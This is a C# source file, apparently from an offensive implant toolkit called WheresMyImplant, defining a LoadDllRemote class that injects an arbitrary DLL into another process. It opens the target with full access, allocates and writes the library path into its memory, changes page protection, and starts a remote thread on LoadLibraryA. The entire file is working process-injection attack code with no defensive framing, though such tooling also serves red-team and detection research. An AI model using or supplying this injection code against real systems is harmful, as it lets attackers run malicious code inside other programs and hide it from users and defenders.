using System;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    internal sealed class LoadDllRemote : Base, IDisposable
    {
        private IntPtr hProcess;
        private IntPtr hThread;
        private IntPtr libraryPtr;
        private String library;
        private UInt32 processId;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal LoadDllRemote(String library, UInt32 processId)
        {
            this.library = library;
            this.processId = processId;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Execute()
        {
            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral(String.Format("Attempting to get handle on {0}", processId));
            hProcess = kernel32.OpenProcess(/*kernel32.PROCESS_CREATE_THREAD | kernel32.PROCESS_QUERY_INFORMATION | kernel32.PROCESS_VM_OPERATION | kernel32.PROCESS_VM_WRITE | kernel32.PROCESS_VM_READ*/ kernel32.PROCESS_ALL_ACCESS, false, processId);
            if (IntPtr.Zero == hProcess)
            {
                WriteOutputBad("Unable to open process");
                return;
            }
            WriteOutputGood(String.Format("Handle: 0x{0}", hProcess.ToString("X4")));

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hModule = kernel32.GetModuleHandle("kernel32.dll");
            if (IntPtr.Zero == hModule)
            {
                WriteOutputBad("Unable to open module handle to kernel32.dll");
                return;
            }

            IntPtr loadLibraryAddr = kernel32.GetProcAddress(hModule, "LoadLibraryA");
            if (IntPtr.Zero == loadLibraryAddr)
            {
                WriteOutputBad("Unable to open module handle to LoadLibraryA");
                return;
            }

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpAddress = IntPtr.Zero;
            UInt32 dwSize = (UInt32)((library.Length + 1) * Marshal.SizeOf(typeof(char)));
            WriteOutputNeutral("Attempting to allocate memory");
            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.PAGE_READWRITE);
            if (IntPtr.Zero == lpBaseAddress)
            {
                WriteOutputBad("Unable to allocate memory");
                return;
            }
            WriteOutputGood(String.Format("Allocated {0} bytes at 0x{1}", dwSize, lpBaseAddress.ToString("X4")));
            WriteOutputGood("Memory Protection Set to PAGE_READWRITE");

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpNumberOfBytesWritten = 0;
            libraryPtr = Marshal.StringToHGlobalAnsi(library);
            WriteOutputNeutral("Attempting to write process memory");
            if (!kernel32.WriteProcessMemory(hProcess, lpBaseAddress, libraryPtr, dwSize, ref lpNumberOfBytesWritten))
            {
                WriteOutputBad("WriteProcessMemory Failed");
                return;
            }
            WriteOutputGood(String.Format("Wrote {0} bytes", lpNumberOfBytesWritten));

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpflOldProtect = 0;
            WriteOutputNeutral("Attempting to Alter Memory Protections to PAGE_EXECUTE_READ");
            if (!kernel32.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect))
            {
                WriteOutputBad("VirtualProtectEx Failed");
                return;
            }
            WriteOutputGood("Set Memory Protection to PAGE_EXECUTE_READ");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpThreadAttributes = IntPtr.Zero;
            UInt32 dwStackSize = 0;
            IntPtr lpParameter = IntPtr.Zero;
            UInt32 dwCreationFlags = 0;
            UInt32 threadId = 0;
            WriteOutputNeutral("Attempting to start remote thread");
            hThread = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, loadLibraryAddr, lpBaseAddress, dwCreationFlags, ref threadId);
            if (IntPtr.Zero == hThread)
            {
                WriteOutputBad("CreateRemoteThread Failed");
                return;
            }

            WriteOutputGood(String.Format("Started Thread: 0x{0}", hThread.ToString("X4")));

            ///////////////////////////////////////////////////////////////////////////////
            kernel32.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        ~LoadDllRemote()
        {
            Dispose();
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            if (IntPtr.Zero != hProcess)
            {
                kernel32.CloseHandle(hProcess);
            }

            if (IntPtr.Zero != hThread)
            {
                kernel32.CloseHandle(hThread);
            }

            if (IntPtr.Zero != libraryPtr)
            {
                Marshal.FreeHGlobal(libraryPtr);
            }
        }
    }
}